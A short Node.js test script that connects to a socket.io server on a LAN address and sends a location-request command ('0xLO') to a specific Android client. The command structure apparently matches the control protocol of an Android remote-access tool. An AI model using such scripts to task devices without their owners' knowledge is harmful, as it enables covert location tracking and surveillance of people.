const io = require('socket.io-client');

// Connect to server
const socket = io('http://192.168.1.101:9400');

socket.on('connect', () => {
    console.log('✅ Connected to server');
    
    // Wait a bit then send a test command
    setTimeout(() => {
        console.log('📤 Sending test command...');
        
        // Send a simple location command to the first connected client
        socket.emit('send_command', {
            clientID: 'android_1758306345283_994', // Use the client ID from logs
            command: {
                type: '0xLO', // Location command
                uid: 'test_' + Date.now()
            }
        });
        
        console.log('✅ Command sent successfully');
    }, 2000);
});

socket.on('disconnect', () => {
    console.log('❌ Disconnected from server');
});

socket.on('error', (error) => {
    console.error('❌ Socket error:', error);
});

// Keep alive
setInterval(() => {
    if (socket.connected) {
        console.log('💓 Connection alive');
    } else {
        console.log('💔 Connection lost');
    }
}, 10000);
